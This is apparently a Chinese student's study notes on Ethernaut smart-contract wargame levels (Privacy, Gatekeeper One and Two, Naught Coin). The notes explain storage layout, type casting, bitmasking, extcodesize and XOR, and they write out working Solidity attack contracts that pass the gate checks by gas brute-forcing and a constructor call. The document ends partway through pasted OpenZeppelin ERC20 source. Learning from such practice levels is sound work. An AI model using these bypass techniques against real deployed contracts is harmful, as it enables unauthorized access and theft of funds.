.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,\r\n      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\\\r\n      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)\r\n      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU\r\n  */\r\n}\r\n说是可以参考Vault那题，先说说查看反编译内容的方法\r\n查看反编译内容\r\n要在Etherscan上面查看\r\n\r\n\r\n状态变量在存储中的布局\r\n（https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html）\r\n除了动态大小的数组和映射(mapping)，数据的存储方式是从位置0开始连续放置在存储中\r\n存储大小少于32字节的多个变量会被打包到一个存储插槽storage slot中\r\n\r\n存储插槽的第一项会以低位对齐的方式储存\r\n值类型仅使用存储它们所需的字节\r\n如果存储插槽中的剩余空间不足以储存一个值类型，那么它会被存入下一个存储插槽\r\n结构体struct和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）\r\n结构体和数组之后的数据也或开启一个新插槽\r\n\r\n\r\n回看题目，stor0是locked，stor1是ID\r\n那么这里的stor5就相当于_key（这边有点不太理解）\r\n利用await web3.eth.getStorageAt(\"0x1D5ddFb5Ce911FEED9B0C5514aD7E58f30b85132\",5)来得到data[2]的值\r\n再用\"0x7b9b6db4bb8f1de0aa618ff30ca9aceb8cf77cd5700414981d7a13c0676304f1\".slice(0,34)获得_key的值（为什么是34？为什么这样子操作没搞懂）\r\n\r\n还有一种编写合约的方法\r\n\r\n14.Gatekeeper One\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract GatekeeperOne {\r\n\r\n  address public entrant;\r\n\r\n  modifier gateOne() {\r\n    require(msg.sender != tx.origin);\r\n    _;\r\n  }\r\n\r\n  modifier gateTwo() {\r\n    require(gasleft() % 8191 == 0);\r\n    _;\r\n  }\r\n\r\n  modifier gateThree(bytes8 _gateKey) {\r\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\r\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\r\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\r\n    _;\r\n  }\r\n\r\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\r\n    entrant = tx.origin;\r\n    return true;\r\n  }\r\n}\r\n这个题目一点思路都没有（跟着教程过一遍）\r\n先看第一个修饰器\r\n  modifier gateOne() {\r\n    require(msg.sender != tx.origin);\r\n    _;\r\n  }\r\n\r\nmsg.sender(address)：消息的发送者（当前调用）\r\ntx.origin(address)：交易的发送者（完整的调用链）\r\n\r\n网上找到一张很清晰的图\r\n\r\n根据第一个修饰器的要求：require(msg.sender != tx.origin);\r\n我们需要用智能合约中调用enter，而不是账号直接调用\r\n先看第三个\r\n  modifier gateThree(bytes8 _gateKey) {\r\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\r\n      require(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\r\n      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\r\n    _;\r\n  }\r\n基本类型之间的转换\r\n1byte=8位（XXXX XXXX）X为0或1\r\nbytes1=uint8......bytes32=uint256\r\nbytes1 num1 = 0x12;     //0x是16进制的表示方法 12是一字节\r\nbytes4 num2 = 0x12121212;   //以此类推12 12 12 12 共四字节\r\n隐式转换\r\n一般是从存储范围小的类型转换到存储范围大的类型\r\n在赋值期间、将参数传递给函数时以及应用运算符时，编译器会自动应用隐式类型转换\r\neg：uint8可转换为uint16和int128、int256\r\n但int8不可转换为uint256，因为uint256不能保存负值\r\n\r\nuint8 y;\r\nuint16 z;\r\nuint32 x = y + z;\r\n在这个示例中，加法的操作数y和z没有相同的类型，但uint8可以隐式转换为uint16，在添加之后执行另一个隐式转换\r\nTip：在整数之间进行类型转换时，数值不发生改变，而将整数类型，特别是比较大的整数类型转换成小数类型时，由于存储方式不同，有可能存在数据精度的损失。\r\n\r\n显示转换\r\n\r\n如果将整数显式转换为更小的类型，则高位位将被截断：\r\n\r\nuint32 a = 0x12345678;\r\nuint16 b = uint16(a); // b will be 0x5678 now\r\n\r\n如果一个整数被显式地转换为一个更大的类型，它会被填充到左边（即，在更高阶的一端）。转换的结果将与原始整数比较：\r\n\r\nuint16 a = 0x1234;\r\nuint32 b = uint32(a); // b will be 0x00001234 now\r\nassert(a == b);\r\n\r\n固定大小字节类型在转换期间表现不同。它们可以被认为是单个字节的序列，转换为更小的类型将切断序列：\r\n\r\nbytes2 a = 0x1234;\r\nbytes1 b = bytes1(a); // b will be 0x12\r\n\r\n如果将固定大小的字节类型显式转换为更大的类型，则会在右侧进行填充。访问固定索引处的字节将在转换前后产生相同的值（如果索引仍在范围内）：\r\n\r\nbytes2 a = 0x1234;\r\nbytes4 b = bytes4(a); // b will be 0x12340000\r\nassert(a[0] == b[0]);\r\nassert(a[1] == b[1]);\r\n\r\nbytes数组和bytescalldata\r\n切片可以显式转换为固定字节类型 ( bytes1/…/\r\nbytes32)。如果数组比目标固定字节类型长，则会在末尾截断。如果数组比目标类型短，它将在末尾用零填充。\r\n\r\n// SPDX-License-Identifier: GPL-3.0\r\npragma solidity ^0.8.5;\r\n\r\ncontract C {\r\n    bytes s = \"abcdefgh\";\r\n    function f(bytes calldata c, bytes memory m) public view returns (bytes16, bytes3) {\r\n        require(c.length == 16, \"\");\r\n        bytes16 b = bytes16(m);  // if length of m is greater than 16, truncation will happen\r\n        b = bytes16(s);  // padded on the right, so result is \"abcdefgh\\0\\0\\0\\0\\0\\0\\0\\0\"\r\n        bytes3 b1 = bytes3(s); // truncated, b1 equals to \"abc\"\r\n        b = bytes16(c[:8]);  // also padded with zeros\r\n        return (b, b1);\r\n    }\r\n}\r\n位掩码\r\n位运算：任何位（0 或 1）与 0 进行 AND 运算后都为\r\n0，对吗？当用 1\r\n完成相同的操作时，无论实际位是什么。所以，0 AND 1等于\r\n0 本身。\r\n现在，如果你这样做0x12345678 AND 0x0000FFFF呢？你会得到0x00005678！\r\n我们刚刚所做的，隐藏了一些位，称为“位掩码”。\r\n直接看题目\r\n假设要发送的_gateKey是0x B1 B2 B3 B4 B5 B6 B7 B8\r\n第一行\r\nrequire(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: invalid gateThree part one\");\r\n如果要写出第一行，则必须满足一下条件：\r\n0x B5 B6 B7 B8 == 0x 00 00 B7 B8\r\n所以B5和B6必须为0！\r\n第二行\r\nrequire(uint32(uint64(_gateKey)) != uint64(_gateKey), \"GatekeeperOne: invalid gateThree part two\");\r\n需要满足条件：\r\n0x 00 00 00 00 B5 B6 B7 B8 != 0x B1 B2 B3 B4 B5 B6 B7 B8\r\n所以前四个字节不能为0（也就是前四个字节可以是除0之外的任何内容）\r\n第三行\r\nrequire(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), \"GatekeeperOne: invalid gateThree part three\");\r\n需要满足要求：\r\n0x B5 B6 B7 B8 = 0x 00 00 SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR\r\n比较1和3行，得到B7和B8是攻击合约地址的最后一个字节！\r\n关键是0x ANY_BYTE ANY_BYTE ANY_BYTE ANY_BYTE 00 00 SECOND_LAST_BYTE_OF_YOUR_ADDR LAST_BYTE_OF_YOUR_ADDR。\r\n可以使用攻击合约的地址来制作_gateKey：\r\n\r\n获取地址的最后8个字节：通过将地址存储在uint64数据类型中来执行此操作。\r\n通过位掩码使 B5 和 B6\r\n为零：使用从上一步获得的值执行与操作0xFFFFFFFF0000FFFF。\r\n现在，只需将其存储uint64到bytes8中，因为enter()函数需要bytes8.\r\n\r\n长这样：\r\nbytes8 key = bytes8(uint64(msg.sender) &amp; 0xFFFFFFFF0000FFFF);\r\n\r\n注意：这里的msg.sender变成tx.origin了！！！\r\n\r\n再来看看第2个修饰器\r\n  modifier gateTwo() {\r\n    require(gasleft() % 8191 == 0);\r\n    _;\r\n  }\r\ngasleft()函数，用于返回剩余的gas\r\n需要满足要求：发送既能确保我们的交易被执行，又能保证gate\r\n2开始时剩余的gas量是8191的倍数的确切的gas\r\n解决方法：\r\n首先，我们需要发送的气体总量可以表示为x + (8191 * k)，在这里x是调用之前用完的gas量，那么gasLeft()剩下的是8191的倍数\r\n我们可以把k固定为一个数，比如说3，现在需要弄清楚的是x\r\n所以使用暴力破解：即尝试发送具有的所有可能值的交易x\r\n类似于这样：\r\nbool success;\r\nuint256 gasBrute;\r\nfor(gasBrute = _lowerGasBrute; gasBrute &lt;= _upperGasBrute; gasBrute++){\r\n    (success, ) = _gatekeeperAddr.call.gas(gasBrute + (8191 * 3))( // `x` is replaced by `gasBrute`\r\n        abi.encodeWithSignature(\"enter(bytes8)\", key) // You have the key from the previous section now\r\n      );\r\n    if(success){\r\n        break;\r\n    }\r\n}        \r\nrequire(success, \"HACK FAILED\");\r\nemit Hacked(gasBrute); // -&gt; This is the least value of `x`.\r\n整合一下，攻击合约如下\r\ncontract skipgate{\r\n  GatekeeperOne keykey;\r\n\r\n  constructor(address _addr){\r\n      keykey=GatekeeperOne(_addr);\r\n  }\r\n\r\n  function attack() external{\r\n    bytes8 _gateKey = bytes8(uint64(uint160(msg.sender))&amp;0xFFFFFFFF0000FFFF);   //在这里要用uint160(msg.sender)，如果没有用uint160处理会报错说不能把address类型转为uint64\r\n\r\n    for(uint256 i=1;i&lt;8191;i++){\r\n       (bool success,)=address(keykey).call{gas: i + (8191 * 3)}(abi.encodeWithSignature(\"enter(bytes8)\", _gateKey));\r\n\r\n           if(success){\r\n        break;\r\n        }\r\n    }\r\n}\r\n在本地测试时编译器一直崩溃，但是上链就行\r\n\r\n15.Gatekeeper Two\r\n源码\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\ncontract GatekeeperTwo {\r\n\r\n  address public entrant;\r\n\r\n  modifier gateOne() {\r\n    require(msg.sender != tx.origin);\r\n    _;\r\n  }\r\n\r\n  modifier gateTwo() {\r\n    uint x;\r\n    assembly { x := extcodesize(caller()) }\r\n    require(x == 0);\r\n    _;\r\n  }\r\n\r\n  modifier gateThree(bytes8 _gateKey) {\r\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\r\n    _;\r\n  }\r\n\r\n  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {\r\n    entrant = tx.origin;\r\n    return true;\r\n  }\r\n}\r\n第一个修饰器和前一题是一样的，需要中间合约来调用函数\r\n第二个修饰器，先需要先学习以下内容\r\nAssembly\r\n这是一个没见过的东西，摘自（https://docs.soliditylang.org/en/v0.4.23/assembly.html#）\r\n\r\nSolidity Assembly：Solidity\r\n定义了一种汇编语言，也可以在没有 Solidity\r\n的情况下使用。这种汇编语言也可以用作 Solidity 源代码中的“内联汇编”。\r\n\r\n句法：Assembly 完全像 Solidity\r\n一样解析注释、文字和标识符，所以你可以使用通常的//和注释。内联汇编由这些花括号和里面的花括号标记，可以使用以下内容/* */``assembly { ... }\r\n\r\n\r\n补充操作码：\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n操作说明\r\n\r\n\r\n解释\r\n\r\n\r\n\r\n\r\nstop\r\n-\r\nF\r\n停止执行，等同于(0,0)\r\n\r\n\r\nadd(x, y)\r\n\r\nF\r\nx + y\r\n\r\n\r\nsub(x, y)\r\n\r\nF\r\nx - y\r\n\r\n\r\nmul(x, y)\r\n\r\nF\r\nx * y\r\n\r\n\r\ndiv(x, y)\r\n\r\nF\r\nx / y\r\n\r\n\r\nsdiv(x, y)\r\n\r\nF\r\nx / y, 对于二进制补码中的有符号数\r\n\r\n\r\nmod(x, y)\r\n\r\nF\r\nx % y\r\n\r\n\r\nsmod(x, y)\r\n\r\nF\r\nx % y, 对于二进制补码中的有符号数\r\n\r\n\r\nexp(x, y)\r\n\r\nF\r\nx 的 y 次方\r\n\r\n\r\nnot(x)\r\n\r\nF\r\n~x, x 的每一位都取反\r\n\r\n\r\nlt(x, y)\r\n\r\nF\r\n如果 x &lt; y 为 1，否则为 0\r\n\r\n\r\ngt(x, y)\r\n\r\nF\r\n如果 x &gt; y 则为 1，否则为 0\r\n\r\n\r\nslt(x, y)\r\n\r\nF\r\n如果 x &lt; y 则为 1，否则为 0，对于二进制补码中的有符号数\r\n\r\n\r\nsgt(x, y)\r\n\r\nF\r\n如果 x &gt; y 则为 1，否则为 0，对于二进制补码中的有符号数\r\n\r\n\r\neq(x, y)\r\n\r\nF\r\n如果 x == y 则为 1，否则为 0\r\n\r\n\r\niszero(x)\r\n\r\nF\r\n如果 x == 0 则为 1，否则为 0\r\n\r\n\r\nand(x, y)\r\n\r\nF\r\nx 和 y 的按位与\r\n\r\n\r\nor(x, y)\r\n\r\nF\r\nx 和 y 的按位或\r\n\r\n\r\nxor(x, y)\r\n\r\nF\r\nx 和 y 的按位异或\r\n\r\n\r\nbyte(n, x)\r\n\r\nF\r\nx 的第 n 个字节，其中最高有效字节是第 0 个字节\r\n\r\n\r\nshl(x, y)\r\n\r\nC\r\ny 逻辑左移 x 位\r\n\r\n\r\nshr(x, y)\r\n\r\nC\r\ny 逻辑右移 x 位\r\n\r\n\r\nsar(x, y)\r\n\r\nC\r\n将 y 算术右移 x 位\r\n\r\n\r\naddmod(x, y, m)\r\n\r\nF\r\n(x + y) % m 任意精度算术\r\n\r\n\r\nmulmod(x, y, m)\r\n\r\nF\r\n(x * y) % m 任意精度算术\r\n\r\n\r\nsignextend(i, x)\r\n\r\nF\r\n符号从最低有效位起第 (i*8+7) 位扩展\r\n\r\n\r\nkeccak256(p, n)\r\n\r\nF\r\nkeccak(mem[p…(p+n)))\r\n\r\n\r\nsha3(p, n)\r\n\r\nF\r\nkeccak(mem[p…(p+n)))\r\n\r\n\r\njump(label)\r\n-\r\nF\r\n跳转到标签/代码位置\r\n\r\n\r\njumpi(label, cond)\r\n-\r\nF\r\n如果 cond 非零则跳转到标签\r\n\r\n\r\npc\r\n\r\nF\r\n当前在代码中的位置\r\n\r\n\r\npop(x)\r\n-\r\nF\r\n删除 x 推送的元素\r\n\r\n\r\ndup1 … dup16\r\n\r\nF\r\n将第 i 个堆栈槽复制到顶部（从顶部开始计数）\r\n\r\n\r\nswap1 … swap16\r\n*\r\nF\r\n交换最顶层和它下面的第 i 个栈槽\r\n\r\n\r\nmload(p)\r\n\r\nF\r\n内存[p..(p+32))\r\n\r\n\r\nmstore(p, v)\r\n-\r\nF\r\n内存[p..(p+32)) := v\r\n\r\n\r\nmstore8(p, v)\r\n-\r\nF\r\nmem[p] := v &amp; 0xff （只修改一个字节）\r\n\r\n\r\nsload(p)\r\n\r\nF\r\n存储[p]\r\n\r\n\r\nsstore(p, v)\r\n-\r\nF\r\n存储[p] := v\r\n\r\n\r\nmsize\r\n\r\nF\r\n内存大小，即最大访问内存索引\r\n\r\n\r\ngas\r\n\r\nF\r\n气体仍然可用于执行\r\n\r\n\r\naddress\r\n\r\nF\r\n当前合约/执行上下文的地址\r\n\r\n\r\nbalance(a)\r\n\r\nF\r\n地址a的wei余额\r\n\r\n\r\ncaller\r\n\r\nF\r\n呼叫发件人（不包括delegatecall）\r\n\r\n\r\ncallvalue\r\n\r\nF\r\nwei 与当前通话一起发送\r\n\r\n\r\ncalldataload(p)\r\n\r\nF\r\n从位置 p 开始调用数据（32 字节）\r\n\r\n\r\ncalldatasize\r\n\r\nF\r\n调用数据的大小（以字节为单位）\r\n\r\n\r\ncalldatacopy(t, f, s)\r\n-\r\nF\r\n从位置 f 的 calldata 复制 s 个字节到位置 t 的内存\r\n\r\n\r\ncodesize\r\n\r\nF\r\n当前合约/执行上下文的代码大小\r\n\r\n\r\ncodecopy(t, f, s)\r\n-\r\nF\r\n从位置 f 的代码复制 s 个字节到位置 t 的内存\r\n\r\n\r\nextcodesize(a)\r\n\r\nF\r\n地址a处代码的大小\r\n\r\n\r\nextcodecopy(a, t, f, s)\r\n-\r\nF\r\n像 codecopy(t, f, s) 但在地址 a 处获取代码\r\n\r\n\r\nreturndatasize\r\n\r\nB\r\n最后返回数据的大小\r\n\r\n\r\nreturndatacopy(t, f, s)\r\n-\r\nB\r\n将 s 个字节从位置 f 的 returndata 复制到位置 t 的 mem\r\n\r\n\r\ncreate(v, p, s)\r\n\r\nF\r\n使用代码 mem[p..(p+s)) 创建新合约并发送 v wei 并返回新地址\r\n\r\n\r\ncreate2(v, n, p, s)\r\n\r\nC\r\n使用代码 mem[p..(p+s)) 在地址 keccak256(\r\n\r\n\r\ncall(g, a, v, in, insize, out, outsize)\r\n\r\nF\r\n在地址 a 调用合约，输入 mem[in..(in+insize)) 提供 g gas 和 v wei\r\n以及输出区域 mem[out..(out+outsize)) 错误返回 0（例如 out of gas）和1\r\n成功\r\n\r\n\r\ncallcode(g, a, v, in, insize, out, outsize)\r\n\r\nF\r\n与 a相同call但仅使用 a\r\n中的代码，否则留在当前合约的上下文中\r\n\r\n\r\ndelegatecall(g, a, in, insize, out, outsize)\r\n\r\nH\r\n相同callcode但也保持caller\r\n和callvalue\r\n\r\n\r\nstaticcall(g, a, in, insize, out, outsize)\r\n\r\nB\r\n相同但不允许状态修改call(g, a, 0, in, insize, out, outsize)\r\n\r\n\r\nreturn(p, s)\r\n-\r\nF\r\n结束执行，返回数据 mem[p..(p+s))\r\n\r\n\r\nrevert(p, s)\r\n-\r\nB\r\n结束执行，恢复状态变化，返回数据 mem[p..(p+s))\r\n\r\n\r\nselfdestruct(a)\r\n-\r\nF\r\n结束执行，销毁当前合约并将资金发送到\r\n\r\n\r\ninvalid\r\n-\r\nF\r\n以无效指令结束执行\r\n\r\n\r\nlog0(p, s)\r\n-\r\nF\r\n没有主题和数据的日志 mem[p..(p+s))\r\n\r\n\r\nlog1(p, s, t1)\r\n-\r\nF\r\n记录主题 t1 和数据 mem[p..(p+s))\r\n\r\n\r\nlog2(p, s, t1, t2)\r\n-\r\nF\r\n记录主题 t1、t2 和数据 mem[p..(p+s))\r\n\r\n\r\nlog3(p, s, t1, t2, t3)\r\n-\r\nF\r\n记录主题 t1、t2、t3 和数据 mem[p..(p+s))\r\n\r\n\r\nlog4(p, s, t1, t2, t3, t4)\r\n-\r\nF\r\n记录主题 t1、t2、t3、t4 和数据 mem[p..(p+s))\r\n\r\n\r\norigin\r\n\r\nF\r\n交易发送方\r\n\r\n\r\ngasprice\r\n\r\nF\r\n交易的gas价格\r\n\r\n\r\nblockhash(b)\r\n\r\nF\r\n块 nr b 的哈希值 - 仅适用于除当前块之外的最后 256 个块\r\n\r\n\r\ncoinbase\r\n\r\nF\r\n当前采矿受益人\r\n\r\n\r\ntimestamp\r\n\r\nF\r\n当前块的时间戳，自纪元以来的秒数\r\n\r\n\r\nnumber\r\n\r\nF\r\n当前区块号\r\n\r\n\r\ndifficulty\r\n\r\nF\r\n当前区块的难度\r\n\r\n\r\ngaslimit\r\n\r\nF\r\n当前区块的区块gas limit\r\n\r\n\r\n\r\n第二个修饰器\r\n  modifier gateTwo() {\r\n    uint x;\r\n    assembly { x := extcodesize(caller()) }\r\n    require(x == 0);\r\n    _;\r\n  }\r\nextcodesize：\r\n在 Solidity 中，我们可以通过在 YUL\r\n中使用汇编来使用低级代码。它们可以在内部使用assembly {...}。extcodesize就是这样一种操作码，它返回任何地址的代码大小。\r\ncaller()：\r\n这是呼叫发送者的地址（delegatecall 除外）。\r\n在上面显示的修饰符中，变量x用于存储caller()地址上代码的大小，即调用\r\nGatekeeper Two\r\n实例的合约。我们需要使用另一个合约来确保我们在第一个关口通过验证。\r\n正在检查该x变量以确保合约代码的大小为 0，换句话说，EOA应该进行调用而不是另一个合约。\r\n\r\n注意：\r\n以太坊中，分为两种账户：\r\n\r\n外部账户：简称EOA，它拥有私钥，其codeHash为空\r\n合约账户：简称CA，它没有私钥，其codeHash非空\r\n\r\n\r\n这是构造函数发挥作用的地方。在合约初始化期间，或调用其构造函数时，其运行时代码大小始终为\r\n0。\r\n因此，当我们放置漏洞利用逻辑并从构造函数内部调用它时，\r\nextcodesize\r\n的返回值将始终返回零。这实质上意味着我们所有的漏洞利用代码都将从我们合约的构造函数内部调用以通过第二道门。\r\n第三个修饰器\r\n  modifier gateThree(bytes8 _gateKey) {\r\n    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);\r\n    _;\r\n  }\r\nXOR（按位异或）\r\nXOR的符号是^\r\n\r\n归零率：a ^ a = 0\r\n恒等率：a ^ 0 = a\r\n交换律：a ^ b = b ^ a\r\n结合律：a ^ b ^ c = a ^ ( b ^ c ) = ( a ^ b ) ^ c\r\n自反：a ^ b ^ a = b\r\nd = a ^ b ^ c 可以推出 a = d ^ b ^ c\r\n若x是二进制数0101，y是二进制数1011，则 x ^ y = 1110\r\n，只有在两个比较的位不同时结果是1，否则结果为0\r\n\r\n这是一个简单的 XOR\r\n运算，我们知道它A XOR B = C等于A XOR C = B。_gateKey使用此逻辑，我们只需使用以下代码即可轻松找到未知数的值：\r\nbytes8 myKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);\r\n攻击代码\r\ncontract skipgate{\r\n  GatekeeperTwo keykey;\r\n\r\n  constructor(address _addr) public {\r\n      keykey=GatekeeperTwo(_addr);\r\n\r\n      bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));\r\n\r\n      keykey.enter(_gateKey);\r\n  }\r\n}\r\n\r\n注意：bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(this)))) ^ (type(uint64).max));这行代码一开始copy进来this为msg.sender不能通过，题目中的msg.sender为攻击合约的地址\r\n\r\n16.Naught Coin\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.0;\r\n\r\nimport 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';\r\n\r\n contract NaughtCoin is ERC20 {\r\n\r\n  // string public constant name = 'NaughtCoin';\r\n  // string public constant symbol = '0x0';\r\n  // uint public constant decimals = 18;\r\n  uint public timeLock = block.timestamp + 10 * 365 days;\r\n  uint256 public INITIAL_SUPPLY;\r\n  address public player;\r\n\r\n  constructor(address _player) \r\n  ERC20('NaughtCoin', '0x0') {\r\n    player = _player;\r\n    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));\r\n    // _totalSupply = INITIAL_SUPPLY;\r\n    // _balances[player] = INITIAL_SUPPLY;\r\n    _mint(player, INITIAL_SUPPLY);\r\n    emit Transfer(address(0), player, INITIAL_SUPPLY);\r\n  }\r\n  \r\n  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {\r\n    super.transfer(_to, _value);\r\n  }\r\n\r\n  // Prevent the initial owner from transferring tokens until the timelock has passed\r\n  modifier lockTokens() {\r\n    if (msg.sender == player) {\r\n      require(block.timestamp &gt; timeLock);\r\n      _;\r\n    } else {\r\n     _;\r\n    }\r\n  } \r\n} \r\n但是部署的时候出现报错说找不到那个库，加上@也不行\r\n\r\n\r\n修改代码为：\r\nimport '@openzeppelin/contracts/token/ERC20/ERC20.sol';\r\nERC20\r\nhttps://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md\r\n// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts (last updated v4.8.0) (token/ERC20/ERC20.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\nimport \"./IERC20.sol\";\r\nimport \"./extensions/IERC20Metadata.sol\";\r\nimport \"../../utils/Context.sol\";\r\n\r\n/**\r\n * @dev Implementation of the {IERC20} interface.\r\n *\r\n * This implementation is agnostic to the way tokens are created. This means\r\n * that a supply mechanism has to be added in a derived contract using {_mint}.\r\n * For a generic mechanism see {ERC20PresetMinterPauser}.\r\n *\r\n * TIP: For a detailed writeup see our guide\r\n * https://forum.openzeppelin.com/t/how-to-implement-erc20-supply-mechanisms/226[How\r\n * to implement supply mechanisms].\r\n *\r\n * The default value of {decimals} is 18. To change this, you should override\r\n * this function so it returns a different value.\r\n *\r\n * We have followed general OpenZeppelin Contracts guidelines: functions revert\r\n * instead returning `false` on failure. This behavior is nonetheless\r\n * conventional and does not conflict with the expectations of ERC20\r\n * applications.\r\n *\r\n * Additionally, an {Approval} event is emitted on calls to {transferFrom}.\r\n * This allows applications to reconstruct the allowance for all accounts just\r\n * by listening to said events. Other implementations of the EIP may not emit\r\n * these events, as it isn't required by the specification.\r\n *\r\n * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}\r\n * functions have been added to mitigate the well-known issues around setting\r\n * allowances. See {IERC20-approve}.\r\n */\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address =&gt; uint256) private _balances;\r\n\r\n    mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    /**\r\n     * @dev Sets the values for {name} and {symbol}.\r\n     *\r\n     * All two of these values are immutable: they can only be set once during\r\n     * construction.\r\n     */\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the\r\n     * name.\r\n     */\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     * For example, if `decimals` equals `2`, a balance of `505` tokens should\r\n     * be displayed to a user as `5.05` (`505 / 10 ** 2`).\r\n     *\r\n     * Tokens usually opt for a value of 18, imitating the relationship between\r\n     * Ether and Wei. This is the default value returned by this function, unless\r\n     * it's overridden.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IERC20-balanceOf} and {IERC20-transfer}.\r\n     */\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-totalSupply}.\r\n     */\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-balanceOf}.\r\n     */\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `to` cannot be the zero address.\r\n     * - the caller must have a balance of at least `amount`.\r\n     */\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-allowance}.\r\n     */\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-approve}.\r\n     *\r\n     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on\r\n     * `transferFrom`. This is semantically equivalent to an infinite approval.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance. This is not\r\n     * required by the EIP. See the note at the beginning of {ERC20}.\r\n     *\r\n     * NOTE: Does not update the allowance if the current allowance\r\n     * is the maximum `uint256`.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `from` and `to` cannot be the zero address.\r\n     * - `from` must have a balance of at least `amount`.\r\n     * - the caller must have allowance for ``from``'s tokens of at least\r\n     * `amount`.\r\n     */\r\n    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically increases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Atomically decreases the allowance granted to `spender` by the caller.\r\n     *\r\n     * This is an alternative to {approve} that can be used as a mitigation for\r\n     * problems described in {IERC20-approve}.\r\n     *\r\n     * Emits an {Approval} event indicating the updated allowance.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     * - `spender` must have allowance for the caller of at least\r\n     * `subtractedValue`.\r\n     */\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner 